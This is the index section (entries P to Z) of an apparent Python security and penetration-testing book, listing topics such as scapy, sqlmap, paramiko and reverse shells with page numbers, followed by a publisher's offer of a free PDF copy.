PyJWT
workingw ith 149-151

PyMuPDF
used, for extracting metadata 447, 448
PyPDF2
used, for extracting metadata 443-447
PyPI
URL 36
PyPI repository
reference link 270
pysftp
used, for connecting SSH servers 258
used, for establishing SSH connection 270, 271
Python 405
authentication mechanisms 137
Chrome forensics with 456-459
concurrency, with ThreadPoolExecutor 69, 70
exceptions management 23-28
files, reading and writing 20-23
files, working with 20
filesystem, working with 49
Firefox forensics with 452-456
HTTP server, implementing 102, 103
modules and packages 28, 29
multiprocessing 66, 67
multithreading 67, 68

network sockets 78, 79
operating system (OS), interacting with 46-49
parameters, managing 31-34
used, for accessing OpenVAS 338-342
used, for building anonymous FTP scanner 255-258
used, for interacting OWASP ZAP 348-353
used, for managing threads 61
used, for reading ZIP file 52, 53
zip files, handling 487-490
Python classes 14, 15
Python dictionary 9-12
item, removing from 12
Python ftplib module
using 248
Python functions 14
built-in functions 13
lambda function 13
user-defined functions 13
python-geoip-geolite2 430
python-geoip-python3
installation link 430
python-gvm modules 323
Python IDLE
debugging with 39

URL 39
Python Imaging Library (PIL) module 438, 439
Python inheritance 16-19
advantages 19
Python Lists 4, 6
elements, adding to 7
elements, searching in 8
reversing 7
Python module
installing 36
used, for extracting geolocation information 430-437
versus Python package 31
python-nmap 287
port scanning 287-290
used, for synchronous and asynchronous scanning 294
Python package
versus Python module 31
Python project
dependencies, managing 36
Python scripting
development environments, setting up 39
Python Tuples 8
python-Wappalyzer 449
R

raw socket 79
Rebex SSH Check 280
URL 280
remote attack 406
request header
obtaining 119, 120
requests
exceptions, managing with 137
HTTP client, building with 125-128
making, with REST API 132-136
proxy, managing with 136, 137
used, for getting images and links from URL 128-132
requests module
HTTP digest authentication, using with 139-142
requests_oauthlib module
client, implementing with 144-148
OAuth clients, implementing with 142
requirements.txt file
generating 37
response headers
obtaining 119, 120
REST API
requests, making with 132-136
reverse shell
implementing, with sockets 93, 95

RSA (Rivest-Shamir-Adleman) 498, 508
RSA signatures
generating, with pycryptodome 508-512
S
scanless port scanner 315-319
scapy 158
commands 159-165
false ARP attack detection 199-201
functions 161
installing 158, 159
network discovery 173-175
network forensics 196, 197
packet-sniffing 187-196
packets, sending 167-170
pcap files, reading with 181-183
port scanning 175-177
reference link 79
traceroute, implementing 177-180
working with, for ARP spoofing attack detection 198, 199
secrets module 519
keys, generating securely 520, 521
secure sockets
implementing, with TLS and SSL modules 107-112
server 450

services
discovering, with Nmap scripts 305
Shellerator 113
Shodan search engine 216
Simple Mail Transfer Protocol (SMTP) 284
SOA Records 227
socket module 79, 81
client socket methods 81, 83
client, using with 87, 88
server socket methods 81, 83
sockets
exceptions, managing with 86, 87
files, sending via 104-106
information, gathering with 83-86
reverse shell, implementing with 93, 94
used, for implementing server and client 95, 96
used, for port scanning 88
SpiderFoot
information, obtaining with 222-225
modules 225, 226
sqlifinder 395
reference link 395
SQL injection 385, 386
discovering, with FuzzDB project 241-244

vulnerable websites, identifying 386, 388
SQL injection vulnerabilities
discovering, with Python tools 384
scanning, with Nmap port scanner 396-398
scanning, with sqlifinder 395, 396
sqlmap 388
URL 388
used, to test website for SQL injection vulnerability 390-395
using 390
ssh-audit
reference link 275
SSH connection
establishing, with paramiko module 260-263
establishing, with pysftp 270, 271
SSH server
connecting, with paramiko 258
connecting, with pysftp 258
executing, on Debian Linux 258, 259
implementing, with paramiko 271-275
security, checking 275
ssh-audit, executing 276-279
ssh-audit, installing 276-279
SSH user credentials
brute-forcing, with paramiko module 268, 269

SSL module
secure sockets, implementing with 107-111
subdomains, by brute force
obtaining 476-478
subprocess module
used, for executing commands 53-59
used, for setting up virtualenv 60, 61
symmetric ciphers 500
symmetric cryptography 498
symmetric encryption
with ciphers package 517-519
with fernet package 513-516
synchronous scanning
implementing 294-299
with python-nmap 294
T
TCP client
implementing 95-99
TCP server
implementing 95, 97
The Harvester
URL 211
thread class constructor
parameters 63

threading 61
threading module 63
reference link 63
working with 63-66
ThreadPoolExecutor
executing, with context manager 71-73
used, for concurrency in Python 69, 70
threads
creating 62
managing, in Python 61
TLS module
secure sockets, implementing with 107-111
Tomcat server
installing 378, 379
testing, with ApacheTomcatScanner 379, 380
vulnerabilities, finding in Censys search engine 380-382
vulnerabilities, scanning with Nmap port scanner 382-384
Transmission Control Protocol (TCP) 248
TXT record 227
U
UDP client
implementing 99-102
UDP server
implementing 99, 100

urllib module 117-119
reference link 117
urllib.request
exceptions, handling with 124
files, downloading with 122-124
used, for extracting emails from URL 121
V
view objects 11
virtual environments (virtualenv) 420
configuring 38, 39
managing 36
setting up, with subprocess module 60, 61
working with 37
vulnerabilities 364
detecting, with Nmap-vulners scripts 312, 313
detecting, with Nmap-vulscan scripts 313-315
discovering, with Nmap scripts 305
formats 408-411
searching for 413-416
searching, in Vulners database 416-419
searching, with Vulners Pompem 419-423
severity 412
vulnerabilities, in CMS web applications
analyzing 374

CMSmap, using 375, 376
Vulnx, as CMS scanner 377, 378
vulnerabilities, in Tomcat server applications
discovering 378
scanning, with Nmap port scanner 382-384
vulnerabilities, in web applications 364
command injection 365
Cross-Site Request Forgery (XSRF/CSRF) 366
Cross-Site Scripting (XSS) 365
detecting process, automating 398
detecting, with Fuxploider 402
open redirect vulnerability, detecting 398-401
sensitive data exposure 366
unvalidated redirects and forwards 366
vulnerability assessment tool
characteristics 324
vulnerability, metrics
base group 412
environmental group 412
temporal group 412
Vulners
reference link 416
Vulnx 377
reference link 377

using, as CMS scanner 377
W
Wappalyzer 449
URL 448
WaybackMachine 213
URL 213
WebApp Information Gatherer (WIG) 450, 451
Web Application Firewall (WAF) 376
web browsers
metadata, extracting from 452
web fuzzing 237
website
technology, identifying 448
Wfuzz 245
URL 244
Wig 450
with statement
reference link 23
WordPress site
executing 482-487
WriteHat
using, as pentesting reports tool 353-360
X

X-Powered-By header 450
Z
Zed Attack Proxy (ZAP) 342
Zenmap
reference link 287
ZIP file
brute-force attacks, executing for 487
handling, in Python 487-491
reading, with Python 52, 53
zip module
reference link 53

Download a free PDF copy of this
book
Thanks for purchasing this book!
Do you like to read on the go but are unable to carry your print
books everywhere?Is your eBook purchase not compatible with the
device of your choice?
Don’t worry, now with every Packt book you get a DRM-free PDF
version of that book at no cost.
Read anywhere, any place, on any device. Search, copy, and paste
code from your favorite technical books directly into your
application. 
The perks don’t stop there. You can get exclusive access to discounts,
newsleĴers, and great free content in your inbox daily.
Follow these simple steps to get the beneﬁts:
1. Scan the QR code or visit the link below:
https://packt.link/free-ebook/9781837637553

2. Submit your proof of purchase.
3. That’s it! We’ll send your free PDF and other beneﬁts to your
email directly.

